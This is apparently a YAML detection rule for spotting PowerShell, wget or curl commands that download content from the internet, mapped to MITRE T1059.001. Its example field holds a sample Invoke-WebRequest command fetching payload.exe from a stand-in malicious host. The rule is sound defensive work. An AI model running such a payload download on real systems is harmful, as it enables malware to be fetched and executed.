id: 8a2b3c4d-5e6f-7890-abcd-ef1234567890
name: Suspicious Download Command
description: Detects PowerShell commands that download content from the internet
categories: ["execution", "download"]
mitre_tactic: Execution
mitre_tactic_id: TA0002
mitre_id: T1059.001
example: 'Invoke-WebRequest -Uri "http://malicious.com/payload.exe"'
condition: |
  (content.contains('Invoke-WebRequest') || content.contains('wget') || content.contains('curl')) && content.contains('http')
